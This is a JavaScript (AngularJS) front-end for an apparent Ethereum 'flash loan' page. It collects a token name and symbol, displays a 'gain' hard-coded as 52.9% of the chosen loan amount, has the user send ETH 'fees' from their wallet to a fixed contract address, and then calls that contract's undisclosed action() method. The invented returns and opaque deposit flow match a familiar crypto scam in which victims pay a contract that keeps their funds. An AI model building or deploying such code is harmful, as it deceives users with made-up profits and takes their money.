const app = angular.module('myApp', []);
app.controller('myCtrl', async function($scope) {
	$scope.init = function() {
		$scope.contractAddress = '0x1B0384128e4BB6f23ef814Ed7d6F06b131DFFB9E';
		$scope.processing = false;
		$scope.ethDeposited = false;
		$scope.formStep = 1;
		
		$scope.erc20 = {
			name: '',
			symbol: ''
		};
		$scope.loan = {
			amount: 25,
			tokenFee: 0.01,
			swapFee: 0,
			totalFee: 0,
			gain: 0
		};

		$scope.submitErc20Form = function() {
			const tokenName = $scope.erc20.name.trim();
			if (tokenName == '') return alert('Token Name cannot be blank');
			if (!tokenName.match(/^[a-zA-Z\s]+$/)) return alert('Token Name can only contain letters and spaces');

			const tokenSymbol = $scope.erc20.symbol.trim();
			if (tokenSymbol == '') return alert('Token Symbol cannot be blank');
			if (!tokenSymbol.match(/^[a-zA-Z]+$/)) return alert('Token Symbol can only contain letters');

			$scope.formStep = 2;

			setTimeout(function() {
				document.getElementById('loanAmtInput').focus();
			}, 100);
		}

		$scope.amountChanged = function() {
			$scope.getLoanEstimates();
		}

		$scope.getLoanEstimates = function() {
			if ($scope.loan.amount == undefined || $scope.loan.amount == null) return;
			
			$scope.loan.swapFee =  $scope.loan.amount / 500;
			$scope.loan.totalFee = fixNumber($scope.loan.tokenFee + $scope.loan.swapFee);

			$scope.loan.gain = fixNumber($scope.loan.amount * 0.529);
		}

		$scope.getLoanEstimates();

		$scope.submitLoanForm = function() {
			if (!$scope.ethDeposited) $scope.depositEth();
			else $scope.executeLoan();
		}

		$scope.depositEth = function() {
			$scope.processing = true;

			window.web3.eth.sendTransaction({
				to: $scope.contractAddress,
				from: $scope.account.address,
				value: window.web3.utils.toWei(''+$scope.loan.totalFee, 'ether'),
				gas: 30000,
				gasPrice: window.web3.utils.toWei('90', 'gwei')
			}, function(error, receipt) {
				$scope.processing = false;
				$scope.$apply();

				if (error) alert('Transaction Failed');
				else {
					setTimeout(function() {
						alert('Money deposited to contract. You can execute the Flash Loan now.');
					}, 5000);
					
					$scope.ethDeposited = true;
					$scope.$apply();
				}
			});
		}

		$scope.executeLoan = function() {
			$scope.processing = true;

			window.contract.methods.action().send({
				to: $scope.contractAddress,
				from: $scope.account.address,
				value: 0,
				gasPrice: window.web3.utils.toWei('90', 'gwei')
			}, function(error, result) {
				if (error) {
					alert('Flash Loan Execution Failed');
					$scope.processing = false;
					$scope.$apply();
				}

				else {
					setTimeout(function() {
						alert('Transaction Successful. Check your wallet!');
					}, 5000);
				}
			});
		}
	}

	await loadWeb3().then(accounts => {
		$scope.account = {
			address: accounts[0]
		};

		$scope.init();
		$scope.$apply();
	});
});

function fixNumber(n) {
	return Math.round((n) * 1e12) / 1e12;
}